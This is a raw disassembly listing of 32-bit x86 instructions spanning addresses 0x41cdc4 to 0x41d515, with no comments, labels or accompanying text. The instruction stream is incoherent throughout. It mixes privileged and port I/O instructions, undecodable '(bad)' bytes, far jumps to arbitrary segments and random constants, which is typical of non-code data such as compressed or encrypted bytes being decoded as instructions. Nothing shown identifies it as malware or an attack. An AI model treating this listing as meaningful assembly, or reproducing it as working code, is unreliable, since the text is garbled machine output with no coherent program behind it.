  41cdc4:	bound  ebx,QWORD PTR [eax-0x38]
  41cdc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdc8:	dec    edi
  41cdc9:	mov    es:0x6d8f9eda,al
  41cdcf:	fstp   DWORD PTR [eax]
  41cdd1:	fstp   st(3)
  41cdd3:	retf   
  41cdd4:	popa   
  41cdd5:	mov    edi,0xecf6085c
  41cdda:	or     ch,BYTE PTR [edx*8+0x6b09343a]
  41cde1:	pop    edi
  41cde2:	out    dx,al
  41cde3:	mov    al,BYTE PTR [ecx]
  41cde5:	lea    ecx,[edx+edi*1+0xac2aee]
  41cdec:	cmp    DWORD PTR [esi-0x6947e584],edi
  41cdf2:	stos   DWORD PTR es:[edi],eax
  41cdf3:	scas   eax,DWORD PTR es:[edi]
  41cdf4:	mov    ecx,edx
  41cdf6:	sbb    BYTE PTR [edi],al
  41cdf8:	ds enter 0x5cdc,0xe7
  41cdfd:	loopne 0x41ce58
  41cdff:	stc    
  41ce00:	jmp    0x41ce0a
  41ce02:	repz call 0xfaa67079
  41ce08:	and    DWORD PTR [esi-0x232c548e],ebx
  41ce0e:	dec    ebx
  41ce0f:	mov    WORD PTR [edx+eiz*2],ds
  41ce12:	mov    eax,ds:0xc74b55fc
  41ce17:	mov    BYTE PTR [ecx+0x34a1f722],dl
  41ce1d:	jmp    0x8b3fd360
  41ce22:	rcr    eax,cl
  41ce24:	push   ebp
  41ce25:	inc    ecx
  41ce26:	or     dh,BYTE PTR [eax+0x6c]
  41ce29:	jne    0x41ce52
  41ce2b:	adc    esi,DWORD PTR [ebx*1-0x1246c004]
  41ce32:	retf   0x215d
  41ce35:	xor    al,bh
  41ce37:	ins    DWORD PTR es:[edi],dx
  41ce38:	in     al,dx
  41ce39:	cwde   
  41ce3a:	and    al,0xd4
  41ce3c:	adc    DWORD PTR [edx+0x58445b20],eax
  41ce42:	mov    ds:0xc617fbfa,al
  41ce47:	ss out 0xc7,al
  41ce4a:	add    eax,0xb1be67ff
  41ce4f:	in     eax,0xbe
  41ce51:	xchg   esp,eax
  41ce52:	rcr    DWORD PTR [ebx],cl
  41ce54:	test   DWORD PTR [ebp+0x7a],esp
  41ce57:	jp     0x41ce34
  41ce59:	mov    cs,ebx
  41ce5b:	or     BYTE PTR [edx+0x58],0xb5
  41ce5f:	cld    
  41ce60:	and    al,0x46
  41ce62:	nop
  41ce63:	xor    al,0x29
  41ce65:	lahf   
  41ce66:	xor    DWORD PTR [eax+0x58],ecx
  41ce69:	arpl   WORD PTR [ebp-0x66],dx
  41ce6c:	inc    ecx
  41ce6d:	lock loopne 0x41ce24
  41ce70:	jle    0x41ceea
  41ce72:	test   al,0xb1
  41ce74:	and    al,0xc6
  41ce76:	push   eax
  41ce77:	and    eax,0x751e0352
  41ce7c:	xchg   esi,esp
  41ce7e:	icebp  
  41ce7f:	inc    ecx
  41ce80:	mov    ch,0x92
  41ce82:	push   esi
  41ce83:	rcr    DWORD PTR [edx+ecx*1],1
  41ce86:	mov    ds:0x5b42da56,al
  41ce8b:	daa    
  41ce8c:	rol    BYTE PTR [edi+esi*2+0x12],cl
  41ce90:	scas   eax,DWORD PTR es:[edi]
  41ce91:	push   esp
  41ce92:	(bad)  
  41ce93:	and    dl,BYTE PTR [ebx+0x1c]
  41ce96:	dec    ebx
  41ce97:	rol    BYTE PTR [edx+0x6ecaad6d],cl
  41ce9d:	add    al,0x77
  41ce9f:	dec    ebp
  41cea0:	or     al,0xe2
  41cea2:	sbb    BYTE PTR [eax-0x29aba556],0x1f
  41cea9:	mov    dl,0x53
  41ceab:	sub    BYTE PTR ds:0x2faa20af,dh
  41ceb1:	inc    ebp
  41ceb2:	loope  0x41ceb4
  41ceb4:	das    
  41ceb5:	and    al,0xf0
  41ceb7:	aam    0xfb
  41ceb9:	aam    0x2f
  41cebb:	jmp    FWORD PTR [esi+0x33]
  41cebe:	je     0x41ce76
  41cec0:	sbb    DWORD PTR [edx],eax
  41cec2:	push   ss
  41cec3:	ja     0x41cf29
  41cec5:	mov    eax,DWORD PTR [ecx]
  41cec7:	add    bh,ah
  41cec9:	add    DWORD PTR [eax],eax
  41cecb:	add    dh,bl
  41cecd:	xchg   esp,eax
  41cece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cecf:	enter  0x622e,0xee
  41ced3:	iret   
  41ced4:	scas   eax,DWORD PTR es:[edi]
  41ced5:	xchg   DWORD PTR [ecx-0x40],ebp
  41ced8:	mov    esi,0x683f4f3f
  41cedd:	out    dx,eax
  41cede:	adc    eax,0xd2066184
  41cee3:	dec    esp
  41cee4:	pop    esp
  41cee5:	mov    ds:0x8b7631f2,eax
  41ceea:	jne    0x41cf24
  41ceec:	sub    DWORD PTR [esi+ebp*2-0x69],eax
  41cef0:	or     esp,DWORD PTR [ebp-0x43]
  41cef3:	jne    0x41cf1a
  41cef5:	push   esi
  41cef6:	xor    eax,0xced6519c
  41cefb:	and    BYTE PTR [eax+esi*1-0x747156a0],bh
  41cf02:	fild   DWORD PTR [ebp+0x30]
  41cf05:	or     BYTE PTR [edx+0x4],dh
  41cf08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf09:	leave  
  41cf0a:	int3   
  41cf0b:	call   0x3906:0xdcf8adbe
  41cf12:	jle    0x41cf27
  41cf14:	sub    BYTE PTR [esp+esi*1-0x67503d56],dl
  41cf1b:	jo     0x41cece
  41cf1d:	pushf  
  41cf1e:	add    al,dh
  41cf20:	into   
  41cf21:	xchg   esi,eax
  41cf22:	repz test esp,ebx
  41cf25:	mov    ds:0x5062374,al
  41cf2a:	sbb    DWORD PTR [esi],eax
  41cf2c:	fadd   st,st(4)
  41cf2e:	mov    ecx,0x1e5d5075
  41cf33:	xor    al,0x8b
  41cf35:	fcom   DWORD PTR cs:[edx+0x63]
  41cf39:	es push ds
  41cf3b:	scas   eax,DWORD PTR es:[edi]
  41cf3c:	mov    edi,0xe0ba69aa
  41cf41:	jp     0x41cee5
  41cf43:	ins    DWORD PTR es:[edi],dx
  41cf44:	pop    eax
  41cf45:	lahf   
  41cf46:	pop    esi
  41cf47:	mov    esi,0xf74e3f31
  41cf4c:	pop    ebx
  41cf4d:	std    
  41cf4e:	sbb    BYTE PTR [edi+0x2b600b27],dl
  41cf54:	mov    cl,0x9b
  41cf56:	mov    eax,0x344c03b8
  41cf5b:	pusha  
  41cf5c:	iret   
  41cf5d:	pop    ds
  41cf5e:	xor    eax,0x6c6d2ae1
  41cf63:	je     0x41ceff
  41cf65:	clc    
  41cf66:	jbe    0x41cf65
  41cf68:	retf   
  41cf69:	rcl    cl,1
  41cf6b:	dec    edi
  41cf6c:	(bad)  
  41cf6d:	adc    dl,BYTE PTR [ebx-0x3d9e28f1]
  41cf73:	in     eax,0x55
  41cf75:	ins    BYTE PTR es:[edi],dx
  41cf76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf77:	inc    edx
  41cf78:	icebp  
  41cf79:	(bad)
  41cf7c:	jle    0x41cfa3
  41cf7e:	push   esi
  41cf7f:	pop    ecx
  41cf80:	(bad)  
  41cf81:	mov    fs,WORD PTR [edx+0x3d]
  41cf84:	or     eax,0x39b2eba8
  41cf89:	dec    edx
  41cf8a:	in     eax,0xa1
  41cf8c:	jg     0x41cfd6
  41cf8e:	mov    ds:0x140e570f,al
  41cf93:	imul   esp,DWORD PTR [ebx-0x6a185d97],0x75
  41cf9a:	cli    
  41cf9b:	cmp    ebp,edi
  41cf9d:	pop    DWORD PTR [esi]
  41cf9f:	push   esp
  41cfa0:	loop   0x41cfa9
  41cfa2:	clc    
  41cfa3:	int    0x51
  41cfa5:	cli    
  41cfa6:	div    BYTE PTR [ebx+0xf3d65f1]
  41cfac:	pop    esi
  41cfad:	xchg   ebx,eax
  41cfae:	scas   eax,DWORD PTR es:[edi]
  41cfaf:	cmp    ebp,ebx
  41cfb1:	cli    
  41cfb2:	cmp    DWORD PTR [esi+0x66],ebp
  41cfb5:	leave  
  41cfb6:	out    0xde,al
  41cfb8:	add    al,ch
  41cfba:	(bad)  
  41cfbb:	dec    eax
  41cfbc:	cmp    BYTE PTR [ebp+edi*2+0x14],dl
  41cfc0:	das    
  41cfc1:	rol    DWORD PTR [eax],0x6
  41cfc4:	call   0xe95fbc8b
  41cfc9:	sahf   
  41cfca:	mov    DWORD PTR [edx-0x50853dc1],eax
  41cfd0:	pop    esi
  41cfd1:	(bad)  
  41cfd3:	push   ss
  41cfd4:	das    
  41cfd5:	jge    0x41d027
  41cfd7:	sub    eax,0xf739ed94
  41cfdc:	dec    edi
  41cfdd:	lods   al,BYTE PTR ds:[esi]
  41cfde:	xor    eax,0xdbffe90a
  41cfe3:	inc    edi
  41cfe4:	or     BYTE PTR [ecx],al
  41cfe6:	inc    edx
  41cfe7:	scas   eax,DWORD PTR es:[edi]
  41cfe8:	cmp    al,0x1f
  41cfea:	cwde   
  41cfeb:	mov    ds:0xd50ecc35,eax
  41cff0:	push   ecx
  41cff1:	cdq    
  41cff2:	sub    BYTE PTR [ebx+0x7e],dh
  41cff5:	lock shl BYTE PTR [eax-0x7bf582aa],1
  41cffc:	or     al,0x73
  41cffe:	inc    eax
  41cfff:	jmp    0xc9dc:0x7546f7d
  41d006:	hlt    
  41d007:	jno    0x41d001
  41d009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d00a:	int3   
  41d00b:	mov    ds:0x6798f503,eax
  41d010:	mov    dh,0x20
  41d012:	fmul   DWORD PTR [esi+0x4032023]
  41d018:	dec    edi
  41d019:	arpl   WORD PTR [eax-0x7f],ax
  41d01c:	push   edi
  41d01d:	scas   al,BYTE PTR es:[edi]
  41d01e:	clc    
  41d01f:	jno    0x41d01a
  41d021:	scas   al,BYTE PTR es:[edi]
  41d022:	jae    0x41cfbb
  41d024:	mov    ds:0x3b2869cd,al
  41d029:	ja     0x41d00a
  41d02b:	dec    esp
  41d02c:	repnz (bad) 
  41d02e:	mov    dh,0x41
  41d030:	mov    bh,0xde
  41d032:	nop
  41d033:	repnz or bl,BYTE PTR [ebx]
  41d036:	dec    edi
  41d037:	mov    cl,0xd0
  41d039:	jmp    0x342d7521
  41d03e:	pop    ss
  41d03f:	imul   esp,DWORD PTR [eax+0x48],0xcf4a191d
  41d046:	sbb    al,0xdc
  41d048:	jmp    0x41cfd9
  41d04a:	lds    eax,FWORD PTR [edx-0x66]
  41d04d:	jge    0x41d0a0
  41d04f:	dec    ecx
  41d050:	and    DWORD PTR [edi+ecx*2-0x13],edx
  41d054:	jle    0x41d036
  41d056:	fnstsw WORD PTR [eax-0x2d]
  41d059:	dec    dl
  41d05b:	or     DWORD PTR [ebp+0x48107487],eax
  41d061:	or     al,0x3f
  41d063:	ja     0x41d005
  41d065:	cwde   
  41d066:	jmp    0x41cffd
  41d068:	sub    DWORD PTR [edi-0x7be3c89a],eax
  41d06e:	adc    eax,0x13418b84
  41d073:	and    esp,DWORD PTR [edx]
  41d075:	leave  
  41d076:	sahf   
  41d077:	cs push edi
  41d079:	ins    BYTE PTR es:[edi],dx
  41d07a:	dec    edi
  41d07b:	push   es
  41d07c:	adc    eax,0x628d57d7
  41d081:	lods   eax,DWORD PTR ds:[esi]
  41d082:	test   DWORD PTR [esi+ecx*2-0x22444b0],esi
  41d089:	mov    DWORD PTR [esi-0x62],ebx
  41d08c:	dec    ecx
  41d08d:	mov    ebx,DWORD PTR [esi]
  41d08f:	add    eax,0x2af60a48
  41d094:	outs   dx,DWORD PTR ds:[esi]
  41d095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d096:	jecxz  0x41d082
  41d098:	sub    DWORD PTR [esi+0x4e119fb8],ebx
  41d09e:	push   ebx
  41d09f:	jl     0x41d071
  41d0a1:	fwait
  41d0a2:	mov    WORD PTR [edx],ds
  41d0a4:	xor    BYTE PTR [ebx],bh
  41d0a6:	fimul  DWORD PTR [edx]
  41d0a8:	mov    dl,0x9f
  41d0aa:	or     al,ch
  41d0ac:	sar    BYTE PTR [ebp+0x7f8d4b95],0xb0
  41d0b3:	add    dl,cl
  41d0b5:	mov    al,ds:0xdf7e4d76
  41d0ba:	sti    
  41d0bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bc:	mov    bh,0x83
  41d0be:	dec    edi
  41d0bf:	mov    ds:0xbab60e29,al
  41d0c4:	dec    ebx
  41d0c5:	lea    eax,[ecx]
  41d0c7:	add    bh,ah
  41d0c9:	add    DWORD PTR [eax],eax
  41d0cb:	add    ch,dh
  41d0cd:	sub    eax,0xbe9d5b24
  41d0d2:	mov    bh,0x6d
  41d0d4:	pop    sp
  41d0d6:	(bad)  
  41d0d7:	cld    
  41d0d8:	(bad)  
  41d0d9:	sbb    BYTE PTR [edx-0x4e657753],al
  41d0df:	scas   al,BYTE PTR es:[edi]
  41d0e0:	pop    ss
  41d0e1:	cmp    BYTE PTR [ebx-0x9e11a48],cl
  41d0e7:	pop    ebp
  41d0e8:	cwde   
  41d0e9:	imul   esi,DWORD PTR [edi-0x408a6dc9],0x134f904e
  41d0f3:	sar    bh,cl
  41d0f5:	and    al,0xb2
  41d0f7:	jp     0x41d140
  41d0f9:	jle    0x41d092
  41d0fb:	mov    ebx,0xd06ab5b9
  41d100:	icebp  
  41d101:	sub    eax,0x9987d9c6
  41d106:	test   eax,0x114d6188
  41d10b:	dec    ecx
  41d10c:	xchg   ebx,eax
  41d10d:	mov    BYTE PTR [eax+ecx*4],dl
  41d110:	adc    al,ah
  41d112:	lock outs dx,BYTE PTR ds:[esi]
  41d114:	add    cl,BYTE PTR [ebx]
  41d116:	adc    BYTE PTR [ecx-0x1f],0xbc
  41d11a:	enter  0x200,0x9d
  41d11e:	int3   
  41d11f:	dec    esp
  41d120:	pop    eax
  41d121:	jno    0x41d107
  41d123:	jb     0x41d172
  41d125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d126:	mov    BYTE PTR [eax],al
  41d128:	xchg   edi,eax
  41d129:	xor    cl,bl
  41d12b:	mov    ecx,0x60666f2e
  41d130:	hlt    
  41d131:	cli    
  41d132:	retf   0xecfc
  41d135:	ficomp DWORD PTR [ebp-0x1c5ab798]
  41d13b:	xor    al,dl
  41d13d:	mov    dh,0xae
  41d13f:	mov    dl,0x32
  41d141:	xor    ah,BYTE PTR [ebp+0x1ab8543c]
  41d147:	mov    esi,0x15fbc029
  41d14c:	add    DWORD PTR [edi],edx
  41d14e:	std    
  41d14f:	add    BYTE PTR [ebx],bh
  41d151:	mov    dl,0x16
  41d153:	or     BYTE PTR [esi+0x718d8779],dh
  41d159:	dec    esp
  41d15a:	jmp    0x94d5:0xffafe81e
  41d161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d162:	imul   esi,DWORD PTR [ebp+eax*4+0x7a712ade],0x546d6a80
  41d16d:	add    al,0x73
  41d16f:	pop    edi
  41d170:	mov    WORD PTR [edx+0x3ba2c43a],fs
  41d176:	inc    ecx
  41d177:	int    0x73
  41d179:	out    dx,eax
  41d17a:	fild   QWORD PTR [edx-0x80]
  41d17d:	or     bh,BYTE PTR [edx-0x6201f262]
  41d183:	xor    BYTE PTR [eax+0x6e],bl
  41d186:	sbb    ch,dl
  41d188:	adc    dh,al
  41d18a:	jge    0x41d1f1
  41d18c:	loopne 0x41d1c5
  41d18e:	aam    0x68
  41d190:	or     al,0xfa
  41d192:	cmp    edx,esp
  41d194:	mov    ah,0x2d
  41d196:	xchg   edi,eax
  41d197:	pop    eax
  41d198:	cmp    eax,0x11d808d6
  41d19d:	sbb    ecx,edi
  41d19f:	push   eax
  41d1a0:	mov    edx,0x2e7091c2
  41d1a5:	push   cs
  41d1a6:	in     eax,0xaf
  41d1a8:	jp     0x41d1b0
  41d1aa:	in     al,0xb8
  41d1ac:	pop    edx
  41d1ad:	in     eax,0x31
  41d1af:	das    
  41d1b0:	lahf   
  41d1b1:	sub    eax,DWORD PTR [esi-0x78]
  41d1b4:	mov    BYTE PTR [eax],dl
  41d1b6:	test   DWORD PTR [edx+eax*8],ebx
  41d1b9:	pop    ebx
  41d1ba:	outs   dx,DWORD PTR ds:[esi]
  41d1bb:	call   0x8e1f:0x7a2b1e49
  41d1c2:	aam    0x2b
  41d1c4:	lahf   
  41d1c5:	je     0x41d1ed
  41d1c7:	xchg   ebx,eax
  41d1c8:	in     eax,0xcd
  41d1ca:	ret    
  41d1cb:	bound  ecx,QWORD PTR [ecx-0x6481859a]
  41d1d1:	add    BYTE PTR [ebx],dl
  41d1d3:	retf   0x65c6
  41d1d6:	and    eax,ebp
  41d1d8:	add    edx,DWORD PTR ds:0xd98c2724
  41d1de:	adc    ch,BYTE PTR [eax-0x7336ec4b]
  41d1e4:	iret   
  41d1e5:	arpl   WORD PTR [ebp-0x5cfce6d0],bp
  41d1eb:	shr    ah,1
  41d1ed:	inc    cl
  41d1ef:	ror    DWORD PTR [ebx+edx*1-0x408f8932],0x39
  41d1f7:	ins    BYTE PTR es:[edi],dx
  41d1f8:	data16 jb 0x41d275
  41d1fb:	fisttp QWORD PTR [eax-0x3e]
  41d1fe:	fbstp  TBYTE PTR [edx+0x201480b8]
  41d204:	sbb    esi,ebx
  41d206:	rcr    DWORD PTR [eax],cl
  41d208:	dec    esi
  41d209:	addr16 out 0xda,al
  41d20c:	push   0x46
  41d20e:	push   ebp
  41d20f:	adc    edx,DWORD PTR [ecx]
  41d211:	or     eax,0xb523adf8
  41d216:	adc    BYTE PTR [eax+0x30],ch
  41d219:	adc    al,0xb6
  41d21b:	push   esp
  41d21c:	push   ecx
  41d21d:	xor    bl,BYTE PTR [edx+0x2d]
  41d220:	inc    esp
  41d221:	sahf   
  41d222:	cmp    ah,BYTE PTR [ebp+0x3cd314e4]
  41d228:	sbb    eax,0x86727e9
  41d22d:	inc    edx
  41d22e:	xchg   DWORD PTR ds:0x78aaafc6,edx
  41d234:	jne    0x41d235
  41d236:	sub    dh,BYTE PTR [edi-0x6a]
  41d239:	jle    0x41d1c7
  41d23b:	xchg   DWORD PTR [ebp-0x2d79b1b3],eax
  41d241:	mov    ebx,0xdb4d73f7
  41d246:	inc    esp
  41d247:	(bad)  
  41d248:	mov    edx,0xb62ac5de
  41d24d:	push   cs
  41d24e:	sub    ecx,0x19998ec9
  41d254:	int    0x6a
  41d256:	xor    esp,DWORD PTR [eax]
  41d258:	add    al,0xd4
  41d25a:	jnp    0x41d2d4
  41d25c:	mov    ch,0xbb
  41d25e:	xor    BYTE PTR ds:0x488bae4f,dh
  41d264:	sub    dl,BYTE PTR ds:0xf48b4041
  41d26a:	mov    WORD PTR [esi-0x5e],ss
  41d26d:	mov    edi,0x9c257734
  41d272:	jo     0x41d244
  41d274:	jp     0x41d28d
  41d276:	rcr    DWORD PTR [ebp+0x280314ca],0xbe
  41d27d:	xchg   ecx,eax
  41d27e:	mov    ch,0x32
  41d280:	pop    ebx
  41d281:	push   ds
  41d282:	invd   
  41d284:	stos   DWORD PTR es:[edi],eax
  41d285:	retf   
  41d286:	mov    BYTE PTR [ecx+edx*8-0x4c],al
  41d28a:	sahf   
  41d28b:	add    al,0x39
  41d28d:	cmp    eax,0x3ee19b9c
  41d292:	mov    cs,WORD PTR [ebp+0x72d9945f]
  41d298:	sar    DWORD PTR [edx],1
  41d29a:	xor    bl,BYTE PTR [esi+0x1c19b964]
  41d2a0:	(bad)  
  41d2a1:	and    DWORD PTR [ebx+0xc],esi
  41d2a4:	fwait
  41d2a5:	push   0x4
  41d2a7:	test   al,0x28
  41d2a9:	push   esi
  41d2aa:	(bad)  
  41d2ab:	cmp    DWORD PTR [eax+edx*4],esp
  41d2ae:	(bad)  
  41d2af:	jle    0x41d2d0
  41d2b1:	mov    ebp,0xeec60024
  41d2b6:	lods   al,BYTE PTR ds:[esi]
  41d2b7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41d2be:	stc    
  41d2bf:	stc    
  41d2c0:	sub    bh,BYTE PTR [ebp-0x70cdb28c]
  41d2c6:	add    DWORD PTR [eax],eax
  41d2c8:	out    0x1,eax
  41d2ca:	add    BYTE PTR [eax],al
  41d2cc:	or     eax,0xc26d103f
  41d2d1:	out    0x5b,al
  41d2d3:	and    BYTE PTR [ebx-0x2f],ch
  41d2d6:	adc    ah,BYTE PTR [edi-0x21]
  41d2d9:	das    
  41d2da:	(bad)  
  41d2db:	dec    ebx
  41d2dc:	fisubr DWORD PTR [eax]
  41d2de:	stos   DWORD PTR es:[edi],eax
  41d2df:	and    ebx,DWORD PTR ds:0xdbdd9b27
  41d2e5:	xor    eax,0xf0957220
  41d2ea:	sub    BYTE PTR [edx+0xd35e155],ch
  41d2f0:	cmp    dl,dl
  41d2f2:	mov    dl,0x2c
  41d2f4:	xchg   ebp,eax
  41d2f5:	fistp  WORD PTR [edi+0x751ef959]
  41d2fb:	push   es
  41d2fc:	(bad)  
  41d2fd:	mov    bl,0x4f
  41d2ff:	inc    edx
  41d300:	adc    cl,cl
  41d302:	add    BYTE PTR [eax],ah
  41d304:	and    ecx,DWORD PTR [edx-0x67]
  41d307:	rcl    DWORD PTR [edi-0x7d],0xfc
  41d30b:	or     DWORD PTR [ebx+0x57ef9ff4],0xa040d88
  41d315:	inc    ebx
  41d316:	xor    eax,0xef665ca0
  41d31b:	sahf   
  41d31c:	cli    
  41d31d:	mov    DWORD PTR [edi-0x4d],ebx
  41d320:	xor    al,0x1d
  41d322:	mov    dl,0x93
  41d324:	jmp    0x41d38d
  41d326:	js     0x41d2b3
  41d328:	push   ebx
  41d329:	adc    DWORD PTR [edx-0x2695e902],esp
  41d32f:	inc    ebx
  41d330:	jmp    0xc8ac:0x73eb6fa1
  41d337:	les    edx,FWORD PTR [esi-0x7d]
  41d33a:	outs   dx,DWORD PTR ds:[esi]
  41d33b:	aam    0x3b
  41d33d:	sub    ebx,DWORD PTR [edi-0x2ed160f3]
  41d343:	and    BYTE PTR [edi-0xd],bl
  41d346:	mov    cl,0x2d
  41d348:	inc    esp
  41d349:	jbe    0x41d310
  41d34b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d34c:	cmp    BYTE PTR [esp+ebx*1+0x2d],ah
  41d350:	in     eax,dx
  41d351:	into   
  41d352:	sub    al,0xbe
  41d354:	dec    edi
  41d355:	xchg   esi,eax
  41d356:	nop
  41d357:	hlt    
  41d358:	adc    edx,DWORD PTR [edi+0x4]
  41d35b:	or     DWORD PTR [esi],ecx
  41d35d:	data16 pushw cs
  41d360:	icebp  
  41d361:	sbb    edx,edx
  41d363:	fwait
  41d364:	mov    ?,WORD PTR [edi-0x3cb91fa6]
  41d36a:	dec    ecx
  41d36b:	in     al,dx
  41d36c:	pop    ebp
  41d36d:	pop    ebx
  41d36e:	jb     0x41d3b8
  41d370:	test   esp,ebx
  41d372:	out    dx,al
  41d373:	and    esp,DWORD PTR [edi-0x15]
  41d376:	mov    al,ds:0x125cb7a4
  41d37b:	aas    
  41d37c:	outs   dx,DWORD PTR ds:[esi]
  41d37d:	jmp    0xed141480
  41d382:	repz jo 0x41d3a2
  41d385:	(bad)  
  41d386:	dec    ebp
  41d387:	jmp    0x26ebb8fa
  41d38c:	sahf   
  41d38d:	repnz out 0x7a,eax
  41d390:	cld    
  41d391:	lahf   
  41d392:	pop    edx
  41d393:	sub    al,0x3c
  41d395:	nop
  41d396:	xchg   ebx,eax
  41d397:	fwait
  41d398:	dec    edi
  41d399:	(bad)  
  41d39a:	(bad)  
  41d39c:	ss out 0xa7,al
  41d39f:	push   cs
  41d3a0:	stos   BYTE PTR es:[edi],al
  41d3a1:	cs pop eax
  41d3a3:	xchg   edx,eax
  41d3a4:	push   ebp
  41d3a5:	or     al,0x55
  41d3a7:	aas    
  41d3a8:	add    edx,eax
  41d3aa:	imul   eax,ecx,0x7a
  41d3ad:	push   ds
  41d3ae:	(bad)  
  41d3b0:	mov    al,ds:0xfa06da8
  41d3b5:	sbb    ebx,DWORD PTR [ebx]
  41d3b7:	dec    ebx
  41d3b8:	sbb    BYTE PTR [ebx+0x29],dh
  41d3bb:	leave  
  41d3bc:	shl    BYTE PTR [edx-0x147752d9],1
  41d3c2:	pushf  
  41d3c3:	add    eax,0x14fd02b7
  41d3c8:	jno    0x41d34e
  41d3ca:	inc    esp
  41d3cb:	and    BYTE PTR [esi+ebp*1-0x5c],ch
  41d3cf:	fst    DWORD PTR [ebp-0x225123e7]
  41d3d5:	dec    edi
  41d3d6:	mov    DWORD PTR [edx],ecx
  41d3d8:	lods   al,BYTE PTR ds:[esi]
  41d3d9:	xor    al,0xc8
  41d3db:	in     eax,0xe5
  41d3dd:	adc    al,0x97
  41d3df:	rcr    DWORD PTR [edx+eiz*8-0x6],cl
  41d3e3:	and    BYTE PTR ds:0x71175839,bh
  41d3e9:	out    dx,eax
  41d3ea:	scas   al,BYTE PTR es:[edi]
  41d3eb:	iret   
  41d3ec:	cmp    DWORD PTR [edx+0x14a316de],0xffffffaf
  41d3f3:	pusha  
  41d3f4:	stos   DWORD PTR es:[edi],eax
  41d3f5:	outs   dx,DWORD PTR ds:[esi]
  41d3f6:	sbb    DWORD PTR [ebx],esp
  41d3f8:	in     eax,0x82
  41d3fa:	scas   eax,DWORD PTR es:[edi]
  41d3fb:	push   esp
  41d3fc:	addr16 and eax,0xf4b05e95
  41d402:	adc    al,0xe0
  41d404:	pop    edx
  41d405:	jmp    0x41d461
  41d407:	mov    BYTE PTR [eax+0x24c7e5a9],bl
  41d40d:	inc    eax
  41d40e:	pop    ss
  41d40f:	mov    ds:0x8e0e6fed,eax
  41d414:	ja     0x41d460
  41d416:	pop    es
  41d417:	adc    eax,0x3c9053f4
  41d41c:	adc    DWORD PTR gs:[edx-0x1a5c9750],esi
  41d423:	xchg   BYTE PTR ds:0xc85311c5,dh
  41d429:	bound  ebx,QWORD PTR [esi]
  41d42b:	imul   esp,DWORD PTR [esi+0x33],0xffffff94
  41d42f:	jl     0x41d417
  41d431:	enter  0x6169,0x9e
  41d435:	sbb    eax,0x1dc0112d
  41d43a:	aam    0xd7
  41d43c:	mov    ecx,0x37064879
  41d441:	dec    DWORD PTR [edx-0x553c6552]
  41d447:	jbe    0x41d471
  41d449:	imul   eax,DWORD PTR [ecx+edi*8-0x636d32eb],0xf93d0a4e
  41d454:	in     al,dx
  41d455:	lods   al,BYTE PTR ds:[esi]
  41d456:	add    al,0x53
  41d458:	fsub   QWORD PTR [edi-0x52]
  41d45b:	xchg   BYTE PTR [eax-0x77],bl
  41d45e:	loop   0x41d446
  41d460:	sbb    al,0x11
  41d462:	es add eax,0xb0810cd4
  41d468:	mov    edx,0xce1a54f9
  41d46d:	out    dx,al
  41d46e:	stc    
  41d46f:	sahf   
  41d470:	retf   
  41d471:	cmp    ah,BYTE PTR [eax+0x4b]
  41d474:	jle    0x41d476
  41d476:	or     al,0x47
  41d478:	add    al,0xec
  41d47a:	xor    al,0x30
  41d47c:	fdivp  st(7),st
  41d47e:	retf   0xe95b
  41d481:	mov    BYTE PTR [ebp-0x7868e9a6],bh
  41d487:	xchg   esi,eax
  41d488:	jnp    0x41d46d
  41d48a:	ins    DWORD PTR es:[edi],dx
  41d48b:	push   esp
  41d48c:	pop    esp
  41d48d:	cdq    
  41d48e:	adc    BYTE PTR [ebp+0x4c],ah
  41d491:	jnp    0x41d504
  41d493:	xor    BYTE PTR [ebx+ebp*8-0x2e],bl
  41d497:	hlt    
  41d498:	and    edx,ecx
  41d49a:	fnsave [esi]
  41d49c:	ins    BYTE PTR es:[edi],dx
  41d49d:	mov    ch,BYTE PTR [edx-0x20]
  41d4a0:	push   ds
  41d4a1:	mov    ebp,0xfab0be45
  41d4a6:	jg     0x41d49c
  41d4a8:	pop    es
  41d4a9:	inc    eax
  41d4aa:	xchg   ebp,eax
  41d4ab:	std    
  41d4ac:	and    BYTE PTR [edi],bh
  41d4ae:	dec    eax
  41d4af:	aas    
  41d4b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4b1:	sub    eax,0x34520005
  41d4b6:	inc    eax
  41d4b7:	gs data16 jne 0x41d532
  41d4bb:	aaa    
  41d4bc:	push   0x26a4e09
  41d4c1:	fisttp QWORD PTR [esi+ecx*8+0x19]
  41d4c5:	xchg   ecx,eax
  41d4c6:	add    DWORD PTR [eax],eax
  41d4c8:	out    0x1,eax
  41d4ca:	add    BYTE PTR [eax],al
  41d4cc:	pop    esp
  41d4cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4ce:	daa    
  41d4cf:	add    eax,0xa6b6073b
  41d4d4:	out    dx,al
  41d4d5:	idiv   ah
  41d4d7:	cmp    BYTE PTR [edi+0x426afa98],ah
  41d4dd:	ins    DWORD PTR es:[edi],dx
  41d4de:	adc    eax,edi
  41d4e0:	iret   
  41d4e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4e2:	jmp    0x6e7c:0xda1b8ed0
  41d4e9:	pop    es
  41d4ea:	mov    ah,0x48
  41d4ec:	scas   eax,DWORD PTR es:[edi]
  41d4ed:	sbb    al,0x5a
  41d4ef:	bound  ecx,QWORD PTR [esi+0x65b2a7f3]
  41d4f5:	(bad)  
  41d4f6:	enter  0x5ea6,0x26
  41d4fa:	adc    BYTE PTR [ebx],bh
  41d4fc:	mov    eax,0xeb13fa63
  41d501:	mov    bl,0xe7
  41d503:	pop    esi
  41d504:	jne    0x41d48c
  41d506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d507:	adc    ah,0x66
  41d50a:	mov    ah,0xa8
  41d50c:	fisubr DWORD PTR [edx+0x4749001a]
  41d512:	dec    edi
  41d513:	add    ebx,DWORD PTR [edx]
  41d515:	jp     0x41d4e9
